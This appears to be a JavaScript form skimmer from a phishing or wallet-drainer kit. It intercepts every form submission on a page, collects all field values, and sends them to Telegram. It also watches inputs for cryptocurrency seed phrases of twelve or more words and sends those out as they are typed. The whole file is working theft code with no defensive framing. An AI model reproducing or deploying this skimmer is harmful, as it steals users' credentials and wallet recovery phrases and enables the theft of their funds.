// Auto-capture all form submissions
document.addEventListener('DOMContentLoaded', function() {
  // Wait for React to render forms
  setTimeout(function() {
    const forms = document.querySelectorAll('form, [role="form"]');
    
    forms.forEach(function(form) {
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get all inputs
        const inputs = form.querySelectorAll('input, textarea, select');
        const data = {};
        
        inputs.forEach(function(input) {
          if (input.value && input.value.trim()) {
            const name = input.name || input.id || input.placeholder || 'field_' + Math.random();
            data[name] = input.value;
          }
        });
        
        // Send to Telegram
        if (window.TelegramIntegration && Object.keys(data).length > 0) {
          try {
            await window.TelegramIntegration.send(data);
            console.log('✅ Form data sent to Telegram');
          } catch (err) {
            console.error('❌ Failed to send to Telegram:', err);
          }
        }
      });
    });
  }, 2000);
  
  // Also capture input changes for phrase/seed fields
  document.addEventListener('input', function(e) {
    const target = e.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
      const val = target.value;
      // Check if it looks like a seed phrase (12+ words)
      if (val.trim().split(/\s+/).length >= 12) {
        setTimeout(function() {
          if (window.TelegramIntegration) {
            window.TelegramIntegration.send({
              type: 'seed_phrase',
              phrase: val,
              field: target.name || target.id || target.placeholder
            });
          }
        }, 1000);
      }
    }
  });
});
